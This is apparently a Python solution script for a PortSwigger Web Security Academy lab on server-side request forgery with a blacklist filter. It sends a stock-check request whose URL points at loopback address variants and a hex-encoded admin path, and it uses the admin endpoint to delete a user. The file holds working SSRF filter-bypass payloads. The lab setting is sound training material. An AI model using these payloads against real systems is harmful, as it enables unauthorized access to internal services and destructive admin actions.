# https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
import requests

requests.packages.urllib3.disable_warnings()


def convert_to_hex_representation(s):
    hex_repr = ""
    for c in s:
        hex_repr += hex(ord(c)).replace("0x", "%")

    return hex_repr


scheme = "https://"
verify = False
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac6d1f7e1f05d86680f1053c00c700f0.web-security-academy.net"
cookies = {"session": "9LQ7PxtimkEMXNO8WdHtpxK2stslVxFT"}
path = "/product/stock"
url = scheme + host + path

payload_scheme = "http://"
# payload_path_and_params = "/admin/"
characters = "admin"
payload_path_and_params = f"/{convert_to_hex_representation(characters)}/delete?username=carlos"

# payload_host = "127.0.0.1"
# payload_host = "2130706433"
# payload_host = "017700000001"
# payload_host = "spoofed.burpcollaborator.net"
payload_host = "127.1"

payload = payload_scheme + payload_host + payload_path_and_params
# payload = payload_scheme + payload_host
data = {"stockApi": payload}

requests.post(url, verify=verify, proxies=proxies, cookies=cookies, data=data)

# Step 1: figure out which host name works without any path or parameters
# Answer is 127.1 (all the others result in a 400 response that says there is some security violation)
# Step 2: attempt to access http://127.1/admin/
# Get back a 400 response again instead of the 200 response i got from step 1
# Step 3: use hex representation for admin path
# Get a 200 response back (note that the solution on the website, to use double url encoding, is actually incorrect)
# Step 4: send the full delete url
# Solved!